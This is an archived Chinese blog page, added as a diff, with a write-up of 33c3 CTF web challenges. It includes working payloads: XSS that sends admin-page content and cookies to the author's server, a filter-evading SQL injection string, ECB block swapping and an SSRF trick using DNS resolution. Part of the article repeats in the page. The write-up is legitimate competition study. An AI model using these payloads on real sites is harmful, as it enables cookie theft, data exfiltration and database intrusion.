@@ -1,0 +1,838 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<title>Bendawang's Site</title>
+<link href="./33c3-CTF-web-WriteUp/font-awesome.min.css" rel="stylesheet"/>
+<link href="./33c3-CTF-web-WriteUp/screen.css" rel="stylesheet"/>
+<link href="./33c3-CTF-web-WriteUp/prism_okaidia.css" rel="stylesheet"/>
+<link href="./33c3-CTF-web-WriteUp/bendawang.css" rel="stylesheet"/>
+<script src="./33c3-CTF-web-WriteUp/jquery.min.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+<div class="show-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img src="./33c3-CTF-web-WriteUp/bendawang.png" style="display:block;width:100%;"/></a>
+</h1>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit test2 hide-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img alt="" height="115" src="./33c3-CTF-web-WriteUp/bendawang.png" width="449"/></a>
+</h1>
+</div>
+<nav class="main-nav unit test1 hide-on-mobiles">
+<ul>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+</div>
+</header>
+<script>
+$('document').ready(function(){
+    $('li[class]:eq(4)').attr('class','current');
+});
+</script>
+<section class="docs">
+<div class="grid">
+<!--移动端-->
+<div class="show-on-mobiles">
+<div class="article-info profile-block">
+<div class="article-info-block">
+               55
+               <span>文章</span>
+</div>
+<div class="article-info-block">
+               5
+               <span>标签</span>
+</div>
+</div>
+<div class="profile-block social-links">
+<table>
+<tbody><tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i></a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i></a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i></a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody></table>
+</div>
+<div class="whole show-on-mobiles">
+<article class="bdw_article">
+<div class="Bendawang" id="Bendawang_mobile">
+<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
+<div class="Bendawang_content" id="Bendawang_content_mobile"></div>
+
+<br/>
+<br/>
+<h1 id="33c3ctfwebwriteup">33c3-CTF-web-WriteUp</h1>
+<p style="max-width:100%;height:auto;">最近不知道怎么回事，整个人只想学学新东西不太想做题。
+好吧不是dota2更新7.0的原因，真的不是。。</p>
+<p style="max-width:100%;height:auto;">元旦high过之后想了想，趁着题目还开着，还是把33c3的题补一下好了。。</p>
+<p style="max-width:100%;height:auto;">感觉33c3的web题目的分值分配有问题，有的高分题很简单，有的低分题却很难。</p>
+<h2 id="web175yolovault"><strong>web175 yolovault</strong></h2>
+<p style="max-width:100%;height:auto;">首先随便注册个账户登陆进去，然后看看大概功能，有个写留言的地方，有个发东西给管理的地方，发的链接管理员会直接访问，加上题目源码里这样一段</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">     &lt;!-- admins only &lt;li&gt;&lt;a href="/?page=leAdminPanel&amp;debug"&gt;Admin Panel&lt;/a&gt;&lt;/li&gt; --&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后大概估摸着是个xss了，但是随便试了试也没啥思路。
+看看链接脑洞下，如果不传page参数呢。。</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://78.46.224.71/?debug
+</code></pre>
+<p style="max-width:100%;height:auto;">发现多了一个<code style="max-width:100%;height:auto;">view-source</code>的按钮，然后跳转到<code style="max-width:100%;height:auto;">http://78.46.224.71/?page=debug&amp;what=index</code>拿到这样的源码：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+include("functions.php");
+if (isset($_GET["page"])) {
+    switch ($_GET["page"]) {
+        case "debug":
+            if (isset($_GET["what"])) {
+                download($_GET["what"]);
+            }
+            break;
+        case "profile":
+        case "secret":
+        case "contact":
+        case "logout":
+        case "login":
+        case "register":
+        case "leAdminPanel":
+            include $_GET["page"].".php";
+            break;
+        default:
+            header("Location: /");
+            break;
+    }
+} else {
+    include("header.php");
+?&gt;
+
+&lt;div class="container"&gt;
+    &lt;div class="row"&gt;
+        &lt;div class="col-md-6"&gt;
+            &lt;ul class="list-group"&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+    &lt;div class="jumbotron text-center"&gt;
+    &lt;h1&gt;YOLO VAULT&lt;/h1&gt;
+    &lt;p&gt;-- under construction --&lt;/p&gt;
+    &lt;p&gt;&lt;/p&gt;
+    &lt;/div&gt;
+    &lt;div class="container"&gt;
+    &lt;div class="row"&gt;
+        &lt;h3&gt;full features coming soon...&lt;/h3&gt;
+    &lt;?php if (logged_in()) { ?&gt;
+        &lt;p&gt;Until then,  store one secret &lt;a href="?page=secret"&gt;here&lt;/a&gt; !&lt;/p&gt;
+    &lt;?php } else { ?&gt;
+        &lt;p&gt;Making your secrets secret again, cause you only live once d00d. &lt;a href="?page=register"&gt;register now!&lt;/a&gt; &lt;/p&gt;
+    &lt;?php } ?&gt;
+    &lt;/div&gt;
+&lt;?php } ?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">既然这样拿到了<code style="max-width:100%;height:auto;">index.php</code>，那么依次就把所有的源码都搞下来把。
+然后就是代码审计。
+看看源码加上之前的猜测是xss，那么就寻找能够打印出来的地方。发现基本上都被<code style="max-width:100%;height:auto;">htmlspecialchars</code>了，但是在<code style="max-width:100%;height:auto;">profile.php</code>下发现漏网之鱼</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">......
+......
+&lt;div class="form-group"&gt;
+                &lt;label class="col-md-4 control-label"&gt;&lt;/label&gt;
+                &lt;div class="col-md-4"&gt;
+                &lt;p&gt;&lt;h3&gt;&lt;?= $_SESSION[&amp;apos;username&amp;apos;]?&gt;&lt;/h3&gt;&lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+......
+......
+</code></pre>
+<p style="max-width:100%;height:auto;">有了这个地方现在需要理清一下思路了。
+我们有一个可以触发执行js的地方，然后可以发送一个链接让admin访问，但是有一个问题，要是想要触发执行js，那么就必须注册一个例如名为<code style="max-width:100%;height:auto;">&lt;script src=&amp;apos;http://104.160.43.154/a.js&amp;apos;&gt;&lt;/script&gt;</code>的账户然后登录，这样子的话就会注销原有admin的回话那么就会导致无法访问flag所在的网页。
+那么我们就可以通过两个iframe来完成我们的目的。
+在我们构造的页面可以这样设计，首先在admin会话存在时用第一个iframe去访问<code style="max-width:100%;height:auto;">http://78.46.224.71/?page=leAdminPanel</code>，然后构造一个登陆表单登陆名为<code style="max-width:100%;height:auto;">&lt;script src=&amp;apos;http://104.160.43.154/a.js&amp;apos;&gt;&lt;/script&gt;</code>的账户，并设置target到第二个iframe，然后让第二个iframe跳转到profile页面执行<code style="max-width:100%;height:auto;">http://104.160.43.154/a.js</code>，这个位于第二个iframe里的<code style="max-width:100%;height:auto;">a.js</code>的作用就是获取第一个iframe的内容并发送给vps，这样子就完成了整个xss的过程。</p>
+<blockquote>
+<p style="max-width:100%;height:auto;">ps：这里由于两个iframe的内容是同域的，虽然和父页不同域，但是根据同源策略两个iframe相互是可以访问对方的资源的。</p>
+</blockquote>
+<p style="max-width:100%;height:auto;">那么我们提交的html如下：</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;html&gt;
+&lt;head&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;iframe id=&amp;apos;1&amp;apos; src=&amp;apos;http://78.46.224.71/?page=leAdminPanel&amp;apos;&gt;
+&lt;/iframe&gt;
+&lt;form action="http://78.46.224.71/?page=login" method="POST" target="profile"&gt;
+    &lt;input name="username" type="text"&gt;
+    &lt;input name="password" type="password"&gt;
+&lt;/form&gt;
+&lt;iframe id=&amp;apos;2&amp;apos; name="profile" src=&amp;apos;http://78.46.224.71/?page=profile&amp;apos;&gt;
+&lt;/iframe&gt;
+&lt;script&gt;
+var xss= "\&lt;script src=&amp;apos;http://104.160.43.154/a.js&amp;apos;\&gt;\&lt;\/script\&gt;";
+$("form input:eq(0)").val(xss);
+$("form input:eq(1)").val(&amp;apos;123&amp;apos;);
+$("form").submit();
+window.top.frames[1].window.location.href=&amp;apos;http://78.46.224.71/?page=profile&amp;apos;;
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后我们的vps上的<code style="max-width:100%;height:auto;">a.js</code>如下：</p>
+<pre><code class="js language-js" style="max-width:100%;height:auto;">var d = window.top.frames[0].window.document.body.innerHTML;
+$.get(&amp;apos;http://104.160.43.154/xss/?a=&amp;apos;+escape(d),function(data,status){});
+</code></pre>
+<p style="max-width:100%;height:auto;">最后测试的时候估计是服务器的bots关了，不过应该没有什么大问题了把。。要是各位师傅发现什么问题请一定要私信我。。。</p>
+<h2 id="web175shia"><strong>web175 Shia</strong></h2>
+<p style="max-width:100%;height:auto;">这道题很容易先找到这个地方<code style="max-width:100%;height:auto;">http://78.46.224.75/quote/1</code>这个地方，这个地方的1存在注入，试试2和1+1，发现返回一样的，那么也就是说这里是个数字注入点。
+但是经过简单的测试发现空格和很多代表空格的特殊符号都被过滤了，就只剩下<code style="max-width:100%;height:auto;">%0d</code>还可以使用，然后简单测试联合注入的列数</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://78.46.224.75/quote/0%0dorder%0dby%0d3
+http://78.46.224.75/quote/0%0dorder%0dby%0d4
+</code></pre>
+<p style="max-width:100%;height:auto;">发现是3列。
+然后联合注入发现最需要的逗号被过滤了，而且像是union、select都过滤，但是可以双写绕过，那么想到通过子查询联结表来凑齐3列。
+即例如这样子</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://78.46.224.75/quote/0 union select * from (select 11)a join (select 22)b join (select 33)c
+由于过滤改写如下：
+http://78.46.224.75/quote/0%0duniunionon%0dselselectect%0d*%0dfrom%0d(seselectlect%0d11)a%0djoijoinn%0d(selselectect%0d22)b%0djojoinin%0d(seselectlect%0d33)c
+</code></pre>
+<p style="max-width:100%;height:auto;">这样子就能够执行select语句并回显。
+<br/><img alt="这里写图片描述" data-action="zoom" src="./33c3-CTF-web-WriteUp/SouthEast" style="max-width:100%;height:auto;"/><br/>
+<code style="max-width:100%;height:auto;">22</code>和<code style="max-width:100%;height:auto;">33</code>都回显了。
+所以我们思路继续往下走就是爆破表名列名之类的了。
+然后就遇到了棘手的问题，就是下划线被过滤了。也就是说我们没法儿访问<code style="max-width:100%;height:auto;">information_schema</code>库了。
+这直接影响就是我们没有办法获取到表名和列名了。表名能够猜到是flag，加上提示表一共有4列。可是问题在于我们没有办法知道列名是啥也就很难直接获取flag。
+但是我们知道一个信息就是一共4列，然后想到还是可以用联合查询来代替掉表名，类似与<code style="max-width:100%;height:auto;">webhacking.kr</code>上有个题，我们看下面的例子</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">mysql&gt; create table test(
+    -&gt; id varchar(100),
+    -&gt; name varchar(100));
+Query OK, 0 rows affected (0.01 sec)
+
+mysql&gt; insert into test values(&amp;apos;1&amp;apos;,&amp;apos;name1&amp;apos;),(&amp;apos;2&amp;apos;,&amp;apos;name2&amp;apos;),(&amp;apos;3&amp;apos;,&amp;apos;name3&amp;apos;);
+
+mysql&gt; select i.1,i.2 from (select 1,2 union select * from test)i;
++------+-------+
+| 1    | 2     |
++------+-------+
+| 1    | 2     |
+| 1    | name1 |
+| 2    | name2 |
+| 3    | name3 |
++------+-------+
+4 rows in set (0.00 sec)
+</code></pre>
+<p style="max-width:100%;height:auto;">可以看到我们通过括号里面的<code style="max-width:100%;height:auto;">select 1,2</code>把列名已经换成了1和2，这样在结合联合查询就不需要知道原有列名是啥就能成功获取内容。
+于是这里我们的思路也就是如下：</p>
+<pre><code class="sql language-sql" style="max-width:100%;height:auto;">union select * from (select 1)a join (select 2)b join (select i.3 from (select 1,2,3,4 union select * from flag)i limit 1)c
+</code></pre>
+<p style="max-width:100%;height:auto;">但是考虑到逗号被过滤了，改写如下:</p>
+<pre><code class="sql language-sql" style="max-width:100%;height:auto;">union select * from (select 1)a join (select 2)b join (select i.3 from (select * from (select 1)d join (select 2)f join (select 3)g join (select 4)h union select * from flag)i limit 1)c
+</code></pre>
+<p style="max-width:100%;height:auto;">然后像是<code style="max-width:100%;height:auto;">union</code>，<code style="max-width:100%;height:auto;">select</code>，<code style="max-width:100%;height:auto;">join</code>都需要双写绕过过滤，加上用%0d绕过对空格的过滤，最后的payload：</p>
+<pre><code class="sql language-sql" style="max-width:100%;height:auto;">0%0duniounionn%0dseselectlect%0d*%0dfrom%0d(seselectlect%0d1)a%0djoijoinn%0d(seselectlect%0d2)b%0djoijoinn%0d(seselectlect%0di.3%0dfrom%0d(seselectlect%0d*%0dfrom%0d(seselectlect%0d1)d%0djoijoinn%0d(seselectlect%0d2)f%0djoijoinn%0d(seselectlect%0d3)g%0djoijoinn%0d(seselectlect%0d4)h%0duniounionn%0dseselectlect%0d*%0dfrom%0dflag)i%0dlimit%0d1%0doffset%0d5)c
+</code></pre>
+<p style="max-width:100%;height:auto;">注意调整limit和offset的值，因为这里逗号被过滤所以使用offset来代替逗号的功能，
+截图如下：
+<br/><img alt="这里写图片描述" data-action="zoom" src="./33c3-CTF-web-WriteUp/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web150try"><strong>web150 try</strong></h2>
+<p style="max-width:100%;height:auto;">应该是一道上传执行的题，但是不想做了。。。所以跳过了</p>
+<h2 id="web200pwn2win"><strong>web200 pwn2win</strong></h2>
+<p style="max-width:100%;height:auto;">在买cheap的时候重定向这里有一串字符</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./33c3-CTF-web-WriteUp/SouthEast" style="max-width:100%;height:auto;"/><br/>
+多次购买发现字符有些地方不变有些地方是一直在变的，但是可以看出，买cheap的时候开头结尾的一部分值是不变的，猜想这里是被加密的，加上观察这段密文应该是被hex过的，也就是密文只有48位，所以猜想应该是某种加密方式，而且关键是中间部分一直在变化但是尾部并没有变，也就是说应该是ebc模式编码，那么随便用买cheap成功的不不变的部分替换买flag的对应部分，结果把结尾替换下就能成功买下flag</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">232c66210158dfb23a2eda5cc945a0a9 650c1ed0fa0a08f6 cc790d4c646aafed 9a216475b31628522f7ef761e2bbe791 //买flag 失败
+5765679f0870f4309b1a3c83588024d7 c146a4104cf9d2c8 b6e54d0a1b1b7a4e 28df361f896eb3c3706cda0474915040 //买cheap 成功
+5765679f0870f4309b1a3c83588024d7 650c1ed0fa0a08f6 ddfc2c4ea92045bd 9a216475b31628522f7ef761e2bbe791 //买flag 成功
+</code></pre>
+<p style="max-width:100%;height:auto;">截图如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./33c3-CTF-web-WriteUp/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web250yoso"><strong>web250 YOSO</strong></h2>
+<p style="max-width:100%;height:auto;">首先简单看看这个网页的功能，
+大概就是可以向admi发送一个链接。
+然后就是可以下载搜索的的书签等等，
+初步猜想也是一道xss，然后想办法获取管理员的cookie，
+然后下载书签这里<code style="max-width:100%;height:auto;">download.php</code>存在参数<code style="max-width:100%;height:auto;">zip</code>
+而且没有过滤。</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://78.46.224.80:1337/download.php?zip=%3Cscript%3Ealert(%22hello%20world%22)%3C/script%3E
+</code></pre>
+<p style="max-width:100%;height:auto;">测试弹窗成功
+那么直接开始构造拿管理员cookie，之后直接登陆下载书签即可。
+payload如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://78.46.224.80:1337/download.php?zip=%3Cscript%3Ewindow.location.href=%22http://104.160.43.154/xss/?a=%22+document.cookie%3C/script%3E
+</code></pre>
+<h2 id="web400list0r"><strong>web400 list0r</strong></h2>
+<p style="max-width:100%;height:auto;">首先随便注册登陆下，没发现什么有用的东西，然后用admin:admin登陆，发现登陆成功了，在里面得到hint说是flag在<code style="max-width:100%;height:auto;">/reeeaally/reallyy/c00l/and_aw3sme_flag</code>下。
+直接访问不行。
+再回去看看有没有什么遗漏的地方。
+发现page参数有点诡异，有点像文件包含，试了试果然是文件包含，那么顺势用<code style="max-width:100%;height:auto;">php://</code>把所有的源码拿下来
+接下来就是代码审计，
+既然有文件包含，加上profile出有上传文件，那么初步想法是上传图片马包含，看<code style="max-width:100%;height:auto;">profile.php</code>上传点：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">require_login();
+
+if (isset($_POST["fname"]) or isset($_POST["lname"]) or isset($_POST["bio"]) or isset($_POST["pic"])) {
+    $pic_name = NULL;
+    if (isset($_POST["pic"]) &amp;&amp; $_POST["pic"] != "" &amp;&amp; !is_admin()) {
+        $pic = get_contents($_POST["pic"]);
+        if (!is_image($pic)) {
+            die("&lt;p&gt;&lt;h3 style=color:red&gt;Does this look like an image to you???????? people are dumb these days...&lt;/h3&gt;&lt;/p&gt;" . htmlspecialchars($pic));
+        } else {
+            $pic_name = "profiles/" . sha1(rand());
+            file_put_contents($pic_name, $pic);
+        }
+    }
+......
+......
+</code></pre>
+<p style="max-width:100%;height:auto;">发现上传后文件被重命名了，而且没有后缀
+<code style="max-width:100%;height:auto;">index.php</code>包含文件代码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+
+if (isset($_GET["page"])) {
+    include $_GET["page"] . ".php";
+} else if (logged_in()) {
+    $lists = get_lists();
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">后来发现没有办法截断php，那么这种上传包含的想法作罢。
+再看看别的地方。
+发现这里上传点的处理不同，因为这里的上传不是单纯的传文件，而是给它一个链接，服务器去链接上去内容，
+那么也就想到了直接让服务器把<code style="max-width:100%;height:auto;">/reeeaally/reallyy/c00l/and_aw3sme_flag</code>的内容取出来。
+看看它的<code style="max-width:100%;height:auto;">get_contents()</code>函数如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">function get_contents($url) {
+        $disallowed_cidrs = [ "127.0.0.1/24", "169.254.0.0/16", "0.0.0.0/8" ];
+
+        do {
+            $url_parts = parse_url($url);
+
+            if (!array_key_exists("host", $url_parts)) {
+                die("&lt;p&gt;&lt;h3 style=color:red&gt;There was no host in your url!&lt;/h3&gt;&lt;/p&gt;");
+            }
+
+            $host = $url_parts["host"];
+
+            if (filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
+                $ip = $host;
+            } else {
+                $ip = dns_get_record($host, DNS_A);
+                if (count($ip) &gt; 0) {
+                    $ip = $ip[0]["ip"];
+                    debug("Resolved to {$ip}");
+                } else {
+                    die("&lt;p&gt;&lt;h3 style=color:red&gt;Your host couldn&amp;apos;t be resolved man...&lt;/h3&gt;&lt;/p&gt;");
+                }
+            }
+
+            foreach ($disallowed_cidrs as $cidr) {
+                if (in_cidr($cidr, $ip)) {
+                    die("&lt;p&gt;&lt;h3 style=color:red&gt;That IP is a blacklisted cidr ({$cidr})!&lt;/h3&gt;&lt;/p&gt;");
+                }
+            }
+
+            // all good, curl now
+            debug("Curling {$url}");
+            $curl = curl_init();
+            curl_setopt($curl, CURLOPT_URL, $url);
+            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($curl, CURLOPT_MAXREDIRS, 0);
+            curl_setopt($curl, CURLOPT_TIMEOUT, 3);
+            curl_setopt($curl, CURLOPT_PROTOCOLS, CURLPROTO_ALL
+                &amp; ~CURLPROTO_FILE
+                &amp; ~CURLPROTO_SCP); // no files plzzz
+            curl_setopt($curl, CURLOPT_RESOLVE, array($host.":".$ip)); // no dns rebinding plzzz
+
+            $data = curl_exec($curl);
+
+            if (!$data) {
+                die("&lt;p&gt;&lt;h3 style=color:red&gt;something went wrong....&lt;/h3&gt;&lt;/p&gt;");
+            }
+
+            if (curl_error($curl) &amp;&amp; strpos(curl_error($curl), "timed out")) {
+                die("&lt;p&gt;&lt;h3 style=color:red&gt;Timeout!! thats a slowass  server&lt;/h3&gt;&lt;/p&gt;");
+            }
+
+            // check for redirects
+            $status = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+            if ($status &gt;= 301 and $status &lt;= 308) {
+                $url = curl_getinfo($curl, CURLINFO_REDIRECT_URL);
+            } else {
+                return $data;
+            }
+
+        } while (1);
+    }
+</code></pre>
+<p style="max-width:100%;height:auto;">发现它对ip进行了限制，而且如果你传的是域名，它会先解析，在判断。
+那么这里有个思路就是调整dns的解析，什么意思呢？
+我们知道，当一条dns对应多个ip的时候，解析是随机的。
+我对我的域名的解析调整如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./33c3-CTF-web-WriteUp/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">将一个域名对应到两个ip上，那么</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./33c3-CTF-web-WriteUp/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">可以看出随机返回一条解析记录。
+那么也就是说，我们多次提交如下链接：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://bendawang.site/reeeaally/reallyy/c00l/and_aw3sme_flag
+</code></pre>
+<p style="max-width:100%;height:auto;">当服务器在判断黑名单的时候如果把<code style="max-width:100%;height:auto;">bendawang.site</code>解析为<code style="max-width:100%;height:auto;">104.160.43.154</code>，而在获取内容的时候解析为<code style="max-width:100%;height:auto;">127.0.0.1</code>，那么我们就能成功获取flag。
+接下来就是不断的提交，试了有5、6次之后顺利拿到flag如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./33c3-CTF-web-WriteUp/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+
+
+
+<!--PC端-->
+<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
+<div class="inner profile-inner">
+<div class="base-info profile-block">
+<img id="avatar" src="./33c3-CTF-web-WriteUp/logo.jpg"/>
+<h2 id="name" style="text-align:center">Bendawang</h2>
+<span id="location" style="font-size:18px">
+<i class="fa fa-map-marker"></i>SiChuan, China</span>
+<a href="/about" id="follow">联系我</a></div>
+<div class="article-info profile-block">
+<div class="article-info-block">
+        55
+          <span>文章</span></div>
+<div class="article-info-block">
+        5
+          <span>标签</span></div>
+</div>
+<div class="profile-block social-links hide-on-mobiles">
+<table>
+<tbody>
+<tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i>
+</a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i>
+</a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i>
+</a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<div class="unit three-quarters hide-on-mobiles">
+<article class="bdw_article">
+<h1 id="33c3ctfwebwriteup">33c3-CTF-web-WriteUp</h1>
+<p style="max-width:100%;height:auto;">最近不知道怎么回事，整个人只想学学新东西不太想做题。
+好吧不是dota2更新7.0的原因，真的不是。。</p>
+<p style="max-width:100%;height:auto;">元旦high过之后想了想，趁着题目还开着，还是把33c3的题补一下好了。。</p>
+<p style="max-width:100%;height:auto;">感觉33c3的web题目的分值分配有问题，有的高分题很简单，有的低分题却很难。</p>
+<h2 id="web175yolovault"><strong>web175 yolovault</strong></h2>
+<p style="max-width:100%;height:auto;">首先随便注册个账户登陆进去，然后看看大概功能，有个写留言的地方，有个发东西给管理的地方，发的链接管理员会直接访问，加上题目源码里这样一段</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">     &lt;!-- admins only &lt;li&gt;&lt;a href="/?page=leAdminPanel&amp;debug"&gt;Admin Panel&lt;/a&gt;&lt;/li&gt; --&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后大概估摸着是个xss了，但是随便试了试也没啥思路。
+看看链接脑洞下，如果不传page参数呢。。</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://78.46.224.71/?debug
+</code></pre>
+<p style="max-width:100%;height:auto;">发现多了一个<code style="max-width:100%;height:auto;">view-source</code>的按钮，然后跳转到<code style="max-width:100%;height:auto;">http://78.46.224.71/?page=debug&amp;what=index</code>拿到这样的源码：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+include("functions.php");
+if (isset($_GET["page"])) {
+    switch ($_GET["page"]) {
+        case "debug":
+            if (isset($_GET["what"])) {
+                download($_GET["what"]);
+            }
+            break;
+        case "profile":
+        case "secret":
+        case "contact":
+        case "logout":
+        case "login":
+        case "register":
+        case "leAdminPanel":
+            include $_GET["page"].".php";
+            break;
+        default:
+            header("Location: /");
+            break;
+    }
+} else {
+    include("header.php");
+?&gt;
+
+&lt;div class="container"&gt;
+    &lt;div class="row"&gt;
+        &lt;div class="col-md-6"&gt;
+            &lt;ul class="list-group"&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+    &lt;div class="jumbotron text-center"&gt;
+    &lt;h1&gt;YOLO VAULT&lt;/h1&gt;
+    &lt;p&gt;-- under construction --&lt;/p&gt;
+    &lt;p&gt;&lt;/p&gt;
+    &lt;/div&gt;
+    &lt;div class="container"&gt;
+    &lt;div class="row"&gt;
+        &lt;h3&gt;full features coming soon...&lt;/h3&gt;
+    &lt;?php if (logged_in()) { ?&gt;
+        &lt;p&gt;Until then,  store one secret &lt;a href="?page=secret"&gt;here&lt;/a&gt; !&lt;/p&gt;
+    &lt;?php } else { ?&gt;
+        &lt;p&gt;Making your secrets secret again, cause you only live once d00d. &lt;a href="?page=register"&gt;register now!&lt;/a&gt; &lt;/p&gt;
+    &lt;?php } ?&gt;
+    &lt;/div&gt;
+&lt;?php } ?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">既然这样拿到了<code style="max-width:100%;height:auto;">index.php</code>，那么依次就把所有的源码都搞下来把。
+然后就是代码审计。
+看看源码加上之前的猜测是xss，那么就寻找能够打印出来的地方。发现基本上都被<code style="max-width:100%;height:auto;">htmlspecialchars</code>了，但是在<code style="max-width:100%;height:auto;">profile.php</code>下发现漏网之鱼</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">......
+......
+&lt;div class="form-group"&gt;
+                &lt;label class="col-md-4 control-label"&gt;&lt;/label&gt;
+                &lt;div class="col-md-4"&gt;
+                &lt;p&gt;&lt;h3&gt;&lt;?= $_SESSION[&amp;apos;username&amp;apos;]?&gt;&lt;/h3&gt;&lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+......
+......
+</code></pre>
+<p style="max-width:100%;height:auto;">有了这个地方现在需要理清一下思路了。
+我们有一个可以触发执行js的地方，然后可以发送一个链接让admin访问，但是有一个问题，要是想要触发执行js，那么就必须注册一个例如名为<code style="max-width:100%;height:auto;">&lt;script src=&amp;apos;http://104.160.43.154/a.js&amp;apos;&gt;&lt;/script&gt;</code>的账户然后登录，这样子的话就会注销原有admin的回话那么就会导致无法访问flag所在的网页。
+那么我们就可以通过两个iframe来完成我们的目的。
+在我们构造的页面可以这样设计，首先在admin会话存在时用第一个iframe去访问<code style="max-width:100%;height:auto;">http://78.46.224.71/?page=leAdminPanel</code>，然后构造一个登陆表单登陆名为<code style="max-width:100%;height:auto;">&lt;script src=&amp;apos;http://104.160.43.154/a.js&amp;apos;&gt;&lt;/script&gt;</code>的账户，并设置target到第二个iframe，然后让第二个iframe跳转到profile页面执行<code style="max-width:100%;height:auto;">http://104.160.43.154/a.js</code>，这个位于第二个iframe里的<code style="max-width:100%;height:auto;">a.js</code>的作用就是获取第一个iframe的内容并发送给vps，这样子就完成了整个xss的过程。</p>
+<blockquote>
+<p style="max-width:100%;height:auto;">ps：这里由于两个iframe的内容是同域的，虽然和父页不同域，但是根据同源策略两个iframe相互是可以访问对方的资源的。</p>
+</blockquote>
